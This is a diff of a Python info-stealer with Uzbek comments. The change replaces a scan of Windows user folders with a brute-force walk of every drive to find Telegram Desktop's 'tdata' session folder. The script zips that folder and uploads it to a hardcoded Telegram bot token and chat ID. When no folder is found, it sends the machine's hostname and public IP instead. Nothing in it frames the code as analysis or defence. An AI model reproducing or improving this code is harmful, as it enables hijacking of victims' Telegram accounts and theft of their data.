@@ -1,4 +1,4 @@
-import sys, urllib.request, os, ctypes, zipfile, socket, tempfile, shutil, time, json, glob
+import sys, urllib.request, os, ctypes, zipfile, socket, tempfile, shutil, time, json
 
 # O'z-o'zini ishga tushirish
 if len(sys.argv) > 0 and "http" in sys.argv[0]:
@@ -15,7 +15,7 @@ if os.name == 'nt':
 BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
 CHAT_ID = 7080045924
 
-# Telegram yuborish funksiyalari
+# Telegram yuborish
 def send_telegram_file(file_path, caption):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
@@ -58,37 +58,35 @@ def zip_folder(folder_path, output_path):
                 except:
                     pass
 
-# ============================================
-# HAMMA YO'LLARNI QIDIRADIGAN SUPER FUNKSIYA
-# ============================================
-def find_tdata_anywhere():
-    drives = [f"{chr(d)}:\\" for d in range(ord('C'), ord('Z') + 1) if os.path.exists(f"{chr(d)}:\\")]
-
-    for drive in drives:
-        # 1. C:\Users papkasini topamiz
-        users_dir = os.path.join(drive, "Users")
-        if os.path.exists(users_dir):
-            # 2. Har bir foydalanuvchi papkasini tekshiramiz
-            for user_folder in os.listdir(users_dir):
-                user_path = os.path.join(users_dir, user_folder)
-                if os.path.isdir(user_path):
-                    # 3. Mumkin bo'lgan 4 ta asosiy yo'lni tekshiramiz
-                    possible_paths = [
-                        os.path.join(user_path, "AppData", "Roaming", "Telegram Desktop", "tdata"),
-                        os.path.join(user_path, "AppData", "Local", "Telegram Desktop", "tdata"),
-                        os.path.join(user_path, "AppData", "Roaming", "TelegramDesktop", "tdata"),
-                        os.path.join(user_path, "AppData", "Local", "TelegramDesktop", "tdata")
-                    ]
-                    for path in possible_paths:
-                        if os.path.exists(path):
-                            return path
+# ============================================================
+# BUTUN KOMPYUTERNI QIDIRADIGAN SUPER FUNKSIYA
+# ============================================================
+def find_tdata_bruteforce():
+    # Barcha mantiqiy disklarni tekshiramiz (C: dan Z: gacha)
+    for drive_letter in range(ord('C'), ord('Z') + 1):
+        drive = f"{chr(drive_letter)}:\\"
+        if os.path.exists(drive):
+            try:
+                # Bu diskdagi barcha papkalarni birma-bir aylanamiz
+                for root, dirs, files in os.walk(drive, topdown=True, followlinks=False):
+                    # Agar yo'lda tdata yoki TelegramDesktop bo'lsa, to'xtaymiz
+                    if os.path.basename(root).lower() == 'tdata':
+                        return root
+                    if 'telegramdesktop' in root.lower():
+                        possible_tdata = os.path.join(root, 'tdata')
+                        if os.path.exists(possible_tdata):
+                            return possible_tdata
+            except:
+                # Ba'zi papkalarga kirish taqiqlangan bo'lishi mumkin, uni o'tkazib yuboramiz
+                pass
     return None
 
-# MAIN FUNKSIYA
+# MAIN
 def main():
     pc_name = socket.gethostname()
     
-    tdata_path = find_tdata_anywhere()
+    send_telegram_message(f"⏳ {pc_name}: Butun kompyuter tdata qidirilmoqda...")
+    tdata_path = find_tdata_bruteforce()
 
     if tdata_path:
         try:
@@ -96,21 +94,21 @@ def main():
             zip_path = os.path.join(temp_dir, f"tdata_{pc_name}.zip")
             if os.path.exists(zip_path): os.remove(zip_path)
 
-            send_telegram_message(f"⏳ {pc_name} da tdata siqilmoqda... (Topildi: {tdata_path})")
+            send_telegram_message(f"⏳ {pc_name}: tdata topildi! ({tdata_path}) siqilmoqda...")
             zip_folder(tdata_path, zip_path)
 
             size_mb = os.path.getsize(zip_path) / (1024 * 1024)
             if size_mb < 49:
-                send_telegram_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}\n📦 Hajmi: {size_mb:.2f} MB")
+                send_telegram_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}\n📂 Manzil: {tdata_path}\n📦 Hajmi: {size_mb:.2f} MB")
             else:
-                send_telegram_message(f"⚠️ tdata juda katta ({size_mb:.2f} MB)")
+                send_telegram_message(f"⚠️ tdata juda katta ({size_mb:.2f} MB), yuborilmadi!")
             os.remove(zip_path)
         except Exception as e:
             send_telegram_message(f"❌ Xatolik: {str(e)}")
     else:
         try:
             ip = urllib.request.urlopen("https://api.ipify.org").read().decode()
-            send_telegram_message(f"⚠️ tdata topilmadi! (Barcha diskdagi hamma foydalanuvchilar tekshirildi)\n🖥 {pc_name}\n🌐 IP: {ip}")
+            send_telegram_message(f"⚠️ tdata topilmadi! (Butun kompyuter qidirildi)\n🖥 {pc_name}\n🌐 IP: {ip}")
         except:
             pass
 
